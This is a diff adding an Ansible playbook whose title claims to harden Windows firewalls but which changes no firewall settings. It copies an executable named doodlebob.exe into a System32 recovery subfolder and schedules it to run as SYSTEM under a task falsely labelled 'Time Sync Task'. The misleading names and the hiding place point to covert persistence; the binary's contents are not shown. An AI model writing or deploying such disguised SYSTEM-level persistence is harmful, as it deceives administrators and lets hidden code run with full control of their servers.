@@ -1,0 +1,28 @@
+---
+- name: Hardening Windows Firewalls - Manual Strategy Automation
+  hosts: windows_servers
+  gather_facts: true
+
+  tasks:
+        - name: Ensure the target directory exists
+          ansible.windows.win_file:
+            path: C:\Windows\System32\Recovery\tmp
+            state: directory
+        - name: Copy doodlebob.py to the target machine
+          ansible.windows.win_copy:
+            src: dist/doodlebob.exe
+            dest: C:\Windows\System32\Recovery\tmp\doodlebob.exe
+
+        - name: Create a scheduled task to run doodlebob.exe 
+          ansible.windows.win_scheduled_task:
+            name: timesyncTask
+            description: "Time Sync Task"
+            state: present
+            username: SYSTEM
+            trigger:
+              - type: time
+                start_boundary: '2026-10-26T17:00:00'
+                enabled: true
+            actions: 
+              - name: Run doodlebob.exe
+                path: C:\Windows\System32\Recovery\tmp\doodlebob.exe
